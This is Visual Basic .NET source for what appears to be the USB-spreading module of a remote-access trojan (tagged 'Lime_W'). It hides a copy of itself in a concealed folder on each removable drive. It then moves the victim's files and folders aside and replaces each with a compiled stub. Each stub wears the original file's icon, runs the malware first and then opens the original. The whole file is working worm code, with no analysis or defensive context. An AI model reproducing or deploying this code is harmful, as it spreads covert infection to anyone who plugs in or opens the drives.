Imports System.Threading
Imports System.IO
Imports System.Environment
Imports System.IO.DriveInfo
Imports System.IO.Directory
Imports System.IO.Path
Imports System.Text
Imports System.Drawing.IconLib
Imports System.Drawing
Imports Microsoft.Win32
Imports System.Windows.Forms

Public Class USB_SP
    'credit to napoleon
    Public Shared Run As New Thread(AddressOf Start, 1)
    Public Shared Assemb As String = "Lime_W"
    Public Shared MyDir As String = "!@"
    Public Shared MyPath As String
    Public Shared FULLPATH As String
    Public Shared HWID As String
    Public Shared Stub As String = "Imports System.Windows.Forms.Application, System.Diagnostics.Process, System.Reflection" & vbNewLine & "<Assembly: AssemblyCopyright(" & """%C%""" & ")> " & vbNewLine & "Module Nervousness" & vbNewLine & "    Sub Main()" & vbNewLine & "        Try" & vbNewLine & "            Start(StartupPath & " & """\%A%""" & ")" & vbNewLine & "        Catch : End Try" & vbNewLine & "        Try" & vbNewLine & "            Start(StartupPath & " & """\%B%""" & ")" & vbNewLine & "        Catch : End Try" & vbNewLine & "    End Sub" & vbNewLine & "End Module"
    Public Shared I As Boolean = True
    Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)

        FULLPATH = FP
        HWID = HW
        MyPath = GetFileName(GetFileName(FULLPATH))

        Try
            If GTV("USB") = Nothing OrElse GTV("USB") = "Not ready" Then
                STV("USB", "Waiting USB")
            End If
        Catch : End Try

        Run.Start()
    End Sub

    Shared Sub Start()
        'RE:
        Thread.Sleep(120000)

        Try
            If Not File.Exists(Application.StartupPath + "\IconLib.dll") Then
                File.WriteAllBytes(Application.StartupPath + "\IconLib.dll", My.Resources.IconLib)
            End If
        Catch ex As Exception
        End Try

        For Each Drivers In GetDrives()
            Try
                If Drivers.DriveType = 2 Then
                    If Not Exists(Drivers.ToString & MyDir) Then
                        CreateDirectory(Drivers.ToString & MyDir)
                        IO.File.SetAttributes(Drivers.ToString & MyDir, FileAttributes.System + FileAttributes.Hidden)
                    End If
                    If Not File.Exists(Drivers.ToString & MyDir & "\" & MyPath) Then
                        File.Copy(FULLPATH, Drivers.ToString & MyDir & "\" & MyPath)
                        File.SetAttributes(Drivers.ToString & MyDir & "\" & MyPath, FileAttributes.System + FileAttributes.Hidden)
                    End If
                    Call GetTheFile(Drivers.ToString)
                End If
            Catch : End Try
        Next

        Exit Sub
        'GoTo RE
    End Sub
    Shared Function GetTheFile(ByVal P As String)
        If P.Length = 0 Then
            Exit Function
        End If
        For Each Files In GetFiles(P)
            If Not GetFileName(Files) = MyPath Then
                If Not IO.Directory.Exists(GetFolderPath(35) & "\" & MachineName & "\") Then
                    IO.Directory.CreateDirectory(GetFolderPath(35) & "\" & MachineName & "\")
                End If
                Try
                    If Not GetExtension(Files).ToLower = ".lnk" Then
                        If ISINF(GetExtension(Files).ToLower) Then
                            If IsValid(Files) = False Then
                                Dim EX = GetIcon(GetExtension(Files).ToLower, Files)
                                Thread.Sleep(10)
                                Try
                                    IO.File.Move(Files, P & MyDir & "\" & GetFileName(Files))
                                Catch : End Try
                                Compile(Stub.Replace("%A%", MyDir & "\" & MyPath).Replace("%B%", MyDir & "\" & GetFileName(Files)).Replace("%C%", Assemb).Replace("Nervousness", Randomz(6)), Files, EX, True)
                                If I = True Then
                                    STV("USB", "Spreaded!")
                                    I = False
                                End If
                            End If
                        Else
                            Dim EX = GetIcon(GetExtension(Files).ToLower, Files)
                            Try
                                IO.File.Move(Files, P & MyDir & "\" & GetFileName(Files))
                            Catch : End Try
                            Compile(Stub.Replace("%A%", MyDir & "\" & MyPath).Replace("%B%", MyDir & "\" & GetFileName(Files)).Replace("%C%", Assemb).Replace("Nervousness", Randomz(6)), Files, EX, True)
                            If I = True Then
                                STV("USB", "Spreaded!")
                                I = False
                            End If
                        End If
                    End If
                Catch : End Try
            End If
        Next
        For Each Directorys In GetDirectories(P)
            Try
                If Not Exists(P & MyDir & "\" & GetFileName(Directorys)) Then
                    If Not GetFileName(P) = MyDir Then
                        Move(Directorys, P & MyDir & "\" & GetFileName(Directorys))
                        Compile(Stub.Replace("%A%", MyDir & "\" & MyPath).Replace("%B%", MyDir & "\" & GetFileName(Directorys)).Replace("%C%", Assemb).Replace("Nervousness", Randomz(6)), Directorys, Nothing, False)
                        If I = True Then
                            STV("USB", "Spreaded!")
                            I = False
                        End If
                    End If
                End If
            Catch : End Try
        Next
    End Function
    Shared Function GetIcon(ByVal EX As String, P As String) As String
        Try
            If Not Exists(GetFolderPath(35) & "\" & MachineName & "\") Then
                CreateDirectory(GetFolderPath(35) & "\" & MachineName & "\")
            End If
            Dim I1 As Icon = Icon.ExtractAssociatedIcon(P), MI As New MultiIcon(), SI As SingleIcon = MI.Add(GetFileName(P))
            SI.CreateFrom(I1.ToBitmap(), IconOutputFormat.Vista)
            SI.Save(GetFolderPath(35) & "\" & MachineName & "\" & MyDir & EX & ".ico")
            Return EX
        Catch : Return Nothing : End Try
    End Function
    Shared Function Compile(ByVal Source As String, Out As String, icon As String, File As Boolean)
        Dim ProviderOptions As New Dictionary(Of String, String)()
        ProviderOptions.Add("CompilerVersion", "v2.0")
        Dim CP = New Microsoft.VisualBasic.VBCodeProvider(ProviderOptions)
        Dim P As New CodeDom.Compiler.CompilerParameters
        Dim s As New StringBuilder()
        s.Append(" /target:winexe")
        s.Append(" /platform:x86")
        s.Append(" /optimize+")
        If File Then
            If icon.Length > 0 Then
                If Exists(GetFolderPath(35) & "\" & MachineName & "\") Then
                    If IO.File.Exists(GetFolderPath(35) & "\" & MachineName & "\" & MyDir & icon & ".ico") Then
                        s.Append(" /win32icon:" & GetFolderPath(35) & "\" & MachineName & "\" & MyDir & icon & ".ico")
                    End If
                End If
            End If
        Else
            IO.File.WriteAllBytes(GetFolderPath(35) & "\" & MachineName & "\" & MyDir & ".ico", Convert.FromBase64String("AAABAAIAEBAAAAAAIABoBAAAJgAAACAgAAAAACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAEAEAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////AYrh/wOB1vMb////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////AZPj/wOK4f99hNv5pWi10AP///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////AZfl/wuS5P+vjeL/+4ff/a1ix+shac7xIW/T9SF02Pkhedv7IX3d+hn///8B////Af///wH///8B////AZTl/wOU5f8xlOT//Y/j//991/f/ZMjs/WnO8f1v0/X9dNj5/Xnb+/t+3vvRW5+0A////wH///8B////Af///wGW5f8DluX/MZbl//2S4///hdz5/2TI7P9pzvH/b9P1/3TY+f952/v9f9/9z3/f/QP///8B////Af///wH///8Bmeb/A5nm/zGZ5v/9leT//4zg/P9lye3/as/x/2/T9v902Pn/etz7/X/g/c+A4f4D////Af///wH///8B////AZvn/wOb5/8xm+f//Zjl//+P4fz/Zcrt/2vP8v9w1Pb/ddj5/3rc+/1/4P21geH+A////wH///8B////Af///wGe6P8Dnuj/MZ7o//2a5v//kuL8/2bL7v9s0PP/cdX2/3bY+f973fz/f9/9H////wH///8B////Af///wH///8BoOn/A6Do/zGh6P/9nef//5Tj/P9ozO//bdHz/3LW9/932fn/fd78/4Df/RX///8B////Af///wH///8B////AaDp/wOf6P8xoun//aDo//+X5P3/ac7w/27S9P9z1/f/eNr6/37e/P+B4P0T////Af///wH///8B////Af///wGg6f8Dn+j/MaPp//2j6f//muX9/2vP8f9w1PX/dNf4/3rb+v9/3/z/g+H9E////wH///8B////Af///wH///8BoOn/A5/o/zGj6f/9pOn//53m/P9t0PP/cdX2/3bZ+P973Pv/geD8/4Th/hP///8B////Af///wH///8B////AaHp/wOg6P8xo+n+/Z/n/P910/P/b9P0/3PW9v942vn/fd37/4Pg/f+G4/4T////Af///wH///8B////Af///wGi6f4Do+n+MZPh+vtszvD9bdDy/XHT9P112Pf9etv6/X/e+/2F4f39iOT+E////wH///8B////Af///wH///8B////AZvj+w1py+5DbM/xQW/R8kFz1fVBd9j4QXzc+kGA3vxBheH9P4rk/gP///8B////Af///wH///8B////Af///wH///8Bbs7wA2vO8ANv0fIDc9X1A3fY+AN73PoDgN/8A4Xi/QP///8B////Af///wH///8B////AQAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8oAAAAIAAAAEAAAAABACAAAAAAAIAQAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////Af///wH///8B////Af///wH///8BieH/A////wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////AYvh/wX///8BiOD/P3jI4y3///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////AZLk/wON4v8D////AYnh/2OH4P//cr3XT////wFVjaAF////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wGU5P8D////AZrk/wON4v+TiuH//4fg//+G3PpF////AXXR8QdozfADa8/yA27S9ANw1PYDc9f4A3bZ+gN52vsDe938A3/g/gP///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wGV5P8XkOP/wY7i//+L4v/5ieH//4vh/0P///8Bi+H/A////wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////AZbl/wP///8Bl+X/KZTl/+OS5P//j+P/+43i//2L4v//etX2c1rB5jlozO9FaM3wQ2vQ8kNu0vRDcNT2Q3PX+EN22fpDedr7Q3vd/EF/4P5He9byH////wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8BlOX/Bf///wGU5f9hlOX//5Tk//mQ4///juL//47j//9tzO//Ycbq/2fL7/9pzfD/a8/y/27S9P9w1Pb/c9f4/3bZ+v952vv/e938+3/g/v971/Oj////AVKPogf///8B////Af///wH///8B////Af///wH///8B////Af///wGV5f8F////AZTl/1+V5f//leX/+5Lk//+P4///j+P//23M7/1hxur9Z8vv/WjN8P1r0PL9btL0/XDU9v1z1/j9dtn6/Xna+/173fz5f+D+/4Df/KH///8BabfPBf///wH///8B////Af///wH///8B////Af///wH///8B////AZbl/wX///8BluX/YZbl//+X5f/7k+T//5Dj//+R5P//cc7w/2HG6v9ny+//aM3w/2vQ8v9u0vT/cdT2/3PX+P922fr/edv7/3vd/Pt/3/3/geH+n////wGA4P4F////Af///wH///8B////Af///wH///8B////Af///wH///8Bl+b/Bf///wGX5v9hl+b//5jm//uV5f//kuP//5Ll//+B2fj/Ysfr/2fL7/9pzfD/a9Dy/27S9P9x1fb/c9f4/3bZ+v952/v/e938+3/f/f+B4f6f////AX/f/AX///8B////Af///wH///8B////Af///wH///8B////Af///wGY5v8F////AZjm/2GZ5v//meb/+5bl//+T5P//k+X//4bd+v9jx+v/Z8vv/2nO8P9s0PL/btL1/3HV9/9z1/j/dtn6/3nb+/983vz7f9/9/4Hh/p////8BgOH+Bf///wH///8B////Af///wH///8B////Af///wH///8B////AZrm/wX///8Bmub/YZrm//+b5v/7l+b//5Tk//+U5f//htz6/2PI7P9nzO//ac7x/2zR8/9u0vX/cdX3/3TX+P922fr/edv7/3ze/Pt/4P3/geH+nf///wGB4f4F////Af///wH///8B////Af///wH///8B////Af///wH///8Bm+f/Bf///wGb5/9hm+f//5zn//uZ5v//luX//5bm//+I3fr/Y8js/2jM7/9qzvH/bNHz/2/T9f9x1ff/dNj4/3fZ+v952/v/fN78+3/g/f+C4f6f////AYHh/gX///8B////Af///wH///8B////Af///wH///8B////Af///wGc6P8F////AZzo/2Gc6P//nef/+5rm//+X5f//l+b//4nd+v9kye3/aM3v/2rO8f9t0fP/b9P1/3LW9/902Pn/d9n6/3rc+/993v3/f+D99YLh/j////8BgeH+A////wH///8B////Af///wH///8B////Af///wH///8B////AZ7o/wX///8Bnej/YZ3o//+f6P/7m+f//5nm//+Z5///it76/2TK7f9pzfD/a8/y/23R9P9w1PX/ctb4/3XY+f932fr/etz7/X3e/f9/3/1R////AX/f/QP///8B////Af///wH///8B////Af///wH///8B////Af///wH///8Bn+j/Bf///wGf6P9hn+j//6Dp//ud5///mub//5rn//+M3/r/Zcrt/2nN8P9r0PL/bdH0/3DU9v9z1vj/ddj5/3ja+v963fv/ft/9/4Df/Sn///8Bf9/9A////wH///8B////Af///wH///8B////Af///wH///8B////Af///wGg6f8F////AaDp/2Gg6P//oen/+57o//+b5v//m+f//43f+v9myu7/as7x/2zQ8v9u0vT/cdX2/3PX+P922Pn/eNr6/3vd/P9+3/3/gN/9Kf///wF/3/0D////Af///wH///8B////Af///wH///8B////Af///wH///8B////AaDp/wX///8BoOj/YaHp//+j6f/7oOj//53n//+d6P//juD7/2bL7/9rz/H/bNDz/2/T9f9x1fb/dNf4/3bZ+f952/v/fN38/3/f/f+B4P0n////AYDg/QP///8B////Af///wH///8B////Af///wH///8B////Af///wH///8BoOn/Bf///wGf6P9hoen//6Tq//uh6f//nuj//57o//+P4Pv/Z8zv/2vQ8v9t0fP/cNT1/3LW9/902Pj/d9n5/3nc+/983vz/f9/9/4Hg/Sf///8BgOD9A////wH///8B////Af///wH///8B////Af///wH///8B////Af///wGg6f8F////AZ/o/2Gh6f//per/+6Lp//+f6P//oOj//5Hh+/9ozfD/bNDy/27S9P9w1Pb/ctb3/3XY+f942vr/etz7/33e/P+A4P3/guD9J////wGB4P0D////Af///wH///8B////Af///wH///8B////Af///wH///8B////AaDp/wX///8Bn+j/YaHp//+m6v/7pOr//6Hp//+h6f//kuH7/2nN8P9t0fP/b9P0/3HV9v9z1/j/dtj5/3ja+v973fv/ft78/4Dg/f+D4f0n////AYLg/QP///8B////Af///wH///8B////Af///wH///8B////Af///wH///8BoOn/Bf///wGf6P9hoen//6bq//ul6v//oun//6Lq//+T4fv/ac7x/27S8/9w0/X/ctX2/3TX+P922fn/edv6/3zd/P9+3vz/geD9/4Pi/if///8BguH+A////wH///8B////Af///wH///8B////Af///wH///8B////Af///wGg6f8F////AZ/o/2Gh6f//pur/+6Xq//+j6f//o+r//5bj+/9rz/L/b9L0/3DU9f9y1vf/ddf4/3fa+f963Pr/fd38/3/f/P+C4f3/hOH+J////wGD4f4D////Af///wH///8B////Af///wH///8B////Af///wH///8B////AaDp/wX///8BoOj/YaHp//+m6v/7per//6Pp//+p7P//kuH6/2rP8v9w0/X/cdX2/3PW9/922Pj/eNv5/3vc+/993fz/gN/8/4Ph/v+F4v4n////AYTi/gP///8B////Af///wH///8B////Af///wH///8B////Af///wH///8Boen/Bf///wGg6P9hoen//6Xq//uk6v//quz//5Ph+f9u0PL/bdHz/3DU9f9y1fb/dNb3/3fZ+f952/r/fN37/37e/P+B3/3/hOH+/4bj/if///8BheL+A////wH///8B////Af///wH///8B////Af///wH///8B////Af///wGh6f8F////AaHp/2Gg6P7/p+v/+6jr//+H2/b/aM3w/2zQ8v9v0/T/cdT1/3PV9v912Pj/eNr5/3rb+/993fv/f978/4Lg/f+F4v7/h+P+J////wGG4v4D////Af///wH///8B////Af///wH///8B////Af///wH///8B////AaHp/wX///8Bn+j+X6Xr//+l6f73etTz+2XM7/tt0PL7btHz+3DT9Pty1PX7dNb3+3bZ+Pt52vn7e9z7+33d+/uA3/z7g+D9+4bi/vuI5P4n////AYfj/gP///8B////Af///wH///8B////Af///wH///8B////Af///wH///8Bo+n+Bf///wGn6/9hl+L7/27P8Ptmy+//bc/x/23Q8/9v0vP/cdP0/3PV9v912Pf/d9n4/3rb+v983Pv/f977/4Hf/f+E4f3/h+P+/4nk/if///8BiOP+A////wH///8B////Af///wH///8B////Af///wH///8B////Af///wGR3/gD////AZvj+zFvzu+JY8ntf23P8X9sz/GBbtHygXDS84Fy1PWBdNf2gXbY94F42fmBe9v6gX3d+4F/3vyBguD9f4Xh/YOH4/53iuT+C////wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wGi5/0Dd9LyBWbL7gVrzvAFbM/xBW7R8gVw0vMFctT1BXTW9gV22PcFeNn5BXrb+gV93fsFf978BYLg/QWE4f0Fh+P+Bf///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"))
            s.Append(" /win32icon:" & GetFolderPath(35) & "\" & MachineName & "\" & MyDir & ".ico")
        End If
        P.GenerateExecutable = True
        P.OutputAssembly = Out
        P.CompilerOptions += s.ToString()
        P.IncludeDebugInformation = False
        P.ReferencedAssemblies.Add("System.Windows.Forms.Dll")
        Dim Results1
        Try
            Results1 = CP.CompileAssemblyFromSource(P, Source)
        Catch : End Try
        Thread.Sleep(10)
        Try
            IO.File.Delete(GetFolderPath(35) & "\" & MachineName & "\" & MyDir & icon & ".ico")
        Catch : End Try
    End Function
    Shared Function IsValid(ByVal P As String) As Boolean
        Try
            Dim Info As FileVersionInfo = FileVersionInfo.GetVersionInfo(P)
            If Info.LegalCopyright.Contains(Assemb) Then
                Return True
            Else
                Return False
            End If
        Catch
            Return False
        End Try
    End Function
    Shared Function ISINF(ByVal EX As String) As Boolean
        If EX.Contains(".exe") Then
            Return True
        End If
    End Function
    Private Shared Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
        Try
            Return Registry.CurrentUser.CreateSubKey("Software\" & HWID).GetValue(n, "")
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Private Shared Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & HWID).SetValue(n, t)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
	    Public Shared Function Randomz(ByVal L As Integer)
        Dim validchars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        Dim sb As New System.Text.StringBuilder()
        Dim rand As New Random()
        For i As Integer = 1 To L
            Dim idx As Integer = rand.Next(0, validchars.Length)
            Dim randomChar As Char = validchars(idx)
            sb.Append(randomChar)
        Next i
        Dim randomString = sb.ToString()
        Return randomString
    End Function

End Class